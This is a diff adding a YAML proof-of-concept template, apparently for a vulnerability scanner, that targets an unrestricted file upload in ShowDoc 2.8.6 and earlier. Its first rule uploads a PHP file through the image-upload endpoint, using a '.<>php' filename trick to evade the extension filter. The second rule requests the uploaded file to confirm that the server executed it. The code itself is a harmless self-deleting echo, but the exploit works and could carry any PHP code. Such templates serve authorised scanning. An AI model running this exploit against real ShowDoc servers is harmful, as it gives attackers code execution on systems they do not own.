@@ -1,0 +1,41 @@
+name: poc-yaml-showdoc-uploadfile
+binding: 95e86791-6ab3-491c-830d-62d2850d9a1b
+manual: true
+detail:
+    author: White(https://github.com/WhiteHSBG)
+    links:
+        - https://github.com/star7th/showdoc/pull/1059
+    vulnerability:
+        id: CT-159094
+        level: high
+    Affected Version: showdoc <= 2.8.6
+    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
+transport: http
+set:
+    filename: randomLowercase(7)
+    rboundary: randomLowercase(8)
+    s1: randomInt(100000, 200000)
+    s2: randomInt(10000, 20000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /index.php?s=/home/page/uploadImg
+            headers:
+                Content-Type: multipart/form-data; boundary=--------------------------{{rboundary}}
+            body: "----------------------------{{rboundary}}\r\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"{{filename}}.<>php\"\r\nContent-Type: text/plain\r\n\r\n<?php echo ''.({{s1}}-{{s2}}); unlink(__FILE__); ?>\r\n----------------------------{{rboundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"success")
+        output:
+            search: '"(?P<date>\\d{4}-\\d{2}-\\d{2})\\\\/(?P<file>[a-f0-9]+\\.php)".bsubmatch(response.body)'
+            date: search["date"]
+            file: search["file"]
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /Public/Uploads/{{date}}/{{file}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
+expression: r0() && r1()
